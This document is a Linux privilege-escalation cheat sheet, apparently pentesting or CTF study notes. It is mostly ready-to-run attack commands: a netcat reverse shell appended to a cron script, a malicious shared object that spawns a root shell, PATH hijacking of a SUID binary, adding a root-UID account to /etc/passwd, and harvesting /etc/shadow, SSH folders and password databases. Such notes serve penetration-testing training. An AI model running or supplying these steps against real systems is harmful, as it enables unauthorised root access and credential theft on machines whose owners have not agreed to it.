# 🐧 Linux Privesc

## Enumeration

```shell
# user
id
whoami

# system
hostname

# net
ifconfig
ip a
ip route
route
routel
sudo tcpdump -i lo -A | grep "pass"

# connections
ss -ntplu
netstat -ntplu

# users
cat /etc/passwd

# OS info
cat /etc/issue
cat /etc/*release
uname -a

# processes
ps aux
# tree
ps axjf

# installed apps on system (debian-based)
dpkg -l

# find writable paths
find / -writable -type d 2>/dev/null

# list drives mounted at boot time 
cat /etc/fstab
mount
lsblk # show available disks

# list loaded kernel modules and get specific info to find an exploit
lsmod
/sbin/modinfo <module>
```

!!! tip
    🍪 Try to switch users using username as pass

## User trails

```shell
# env vars
env
# .bashrc config
cat .bashrc
watch -n 1 "ps -aux | grep pass"
```

## Interesting Files

```shell
# check history
history
cat ~/.*history | less

# config files
find /home/<user> -type f \( -name "*.txt" -o -name "*.conf" -o -name "*.ini" \) 2>/dev/null

# .ssh folder
find /home/<user> -type d -name ".ssh" 2>/dev/null

# kdbx files
find / -name "*.kdbx" 2>/dev/null
```

## Cron jobs

!!! tip
    🍪 Examine periodic processes with [pspy](https://github.com/DominicBreuker/pspy)

```shell
ls -lah /etc/cron*
# current user's jobs
crontab -l
# root user's jobs
sudo crontab -l

# inspect cron logs
grep "CRON" /var/log/syslog

# reverse shell to cron file
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> > /tmp/f" >> scripts/user_backups.sh 
```

## SUID/SGID/Sudo/Caps

!!! tip
    🍪 Check [GTFOBins](https://gtfobins.github.io/) for escaping the programs

```shell
# find programs and groups with bit
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# list capabilities
/usr/sbin/getcap -r / 2>/dev/null

# check sudo privs
sudo -l
```

### Path Hijacking

A SUID executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.

Run **strings** on the file to look for strings of printable characters:

```shell
strings <suidexecutable>
```

One line (`apache2`) suggests that the service executable is being called to start the webserver, however the full path of the executable (`/usr/sbin/service`) is not being used.

Create a malicious file in a writable path and call it like the file the SUID executable calls.

```shell
echo '/bin/bash -i' > /tmp/apache2
```

Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid executable to gain a root shell:

```shell
export PATH=/tmp:$PATH
```

### Shared Object Injection

A SUID executable can be vulnerable to shared object injection.
First, execute the file and note that currently it displays a progress bar before exiting.

Run **strace** on the file and search the output for open/access calls and for "no such file" errors:

```shell
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

Note that the executable tries to load the `/home/user/.config/libcalc.so` shared object within the home directory, but it cannot be found.
Create the **.config** directory for the libcalc.so file: `mkdir /home/user/.config`

Compile a malicious code into a shared object at the location the **suid-so** executable was looking for it:

```c
#include <stdio.h>
#include <stdlib.h>
int main() { 
    system("/bin/bash"); 
    return 0; 
}
```

```shell
gcc -shared -fPIC /home/user/tools/suid/libcalc.c -o /home/user/.config/libcalc.so 
```

Execute the **suid-so** executable again, and note that this time, instead of a progress bar, we get a root shell.

```shell
/usr/local/bin/suid-so
```

## Weak file permissions

```shell
# check if /etc/shadow can be readed and get the root hash or the file
unshadow passwd shadow > passwords.txt

# check if /etc/shadow can be writable and put a new root hash
mkpasswd -m sha-512 newpassword

# check if /etc/passwd can be writable and put a new root hash
openssl passwd newpass
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```

## Kernel exploits

```shell
cat /etc/issue
uname -r
arch

# find a public exploit
searchsploit <name>
```

## Automated Scripts

- [linPEAS.sh](https://github.com/peass-ng/PEASS-ng?tab=readme-ov-file)
- [Liinux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)

## NFS

```shell
# mountable shares
cat /etc/exports
showmount -e <ip>

# mount a share
mkdir /tmp/share
mount -o rw <ip>:<share> /tmp/share

# using Kali's root user, generate a payload and save it to the mounted share
# using Kali's root user, make the file executable and set the SUID permission:
chmod +xs share/shell.elf

# on the victim, as the low privileged user, execute the file to gain a root shell:
/<share_path>/shell.elf
```
